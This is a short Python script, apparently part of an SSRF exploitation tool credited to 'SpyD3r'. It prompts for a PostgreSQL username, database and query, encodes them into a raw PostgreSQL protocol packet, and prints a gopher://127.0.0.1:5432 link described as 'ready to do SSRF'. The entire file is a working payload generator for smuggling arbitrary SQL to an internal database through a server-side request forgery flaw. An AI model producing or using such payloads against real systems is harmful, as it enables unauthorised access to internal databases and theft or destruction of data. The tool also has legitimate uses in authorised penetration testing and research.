import binascii
import urllib.parse


def PostgreSQL():
    user = input("\033[96m" + "PostgreSQL Username: " + "\033[0m")
    db = input("\033[96m" + "Database Name: " + "\033[0m")
    query = input("\033[96m" + "Query: " + "\033[0m")

    encode_user = binascii.hexlify(user.encode()).decode()
    encode_db = binascii.hexlify(db.encode()).decode()
    encode_query = binascii.hexlify(query.encode()).decode()
    len_query = len(query) + 5

    start = (
        "000000"
        + binascii.hexlify(bytes([4 + len(user) + 8 + len(db) + 13])).decode()
        + "000300"
    )
    data = (
        "00"
        + binascii.hexlify(b"user").decode()
        + "00"
        + encode_user
        + "00"
        + binascii.hexlify(b"database").decode()
        + "00"
        + encode_db
    )
    data += "0000510000" + format(len_query, "04x")
    data += encode_query
    end = "005800000004"

    packet = start + data + end

    def encode(s):
        return "gopher://127.0.0.1:5432/_%" + "%".join(
            [s[i : i + 2] for i in range(0, len(s), 2)]
        )

    print("\033[93m" + "\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
    print("\033[04m" + encode(packet) + "\033[0m")
    print("\n" + "\033[41m" + "-----------Made-by-SpyD3r-----------" + "\033[0m")
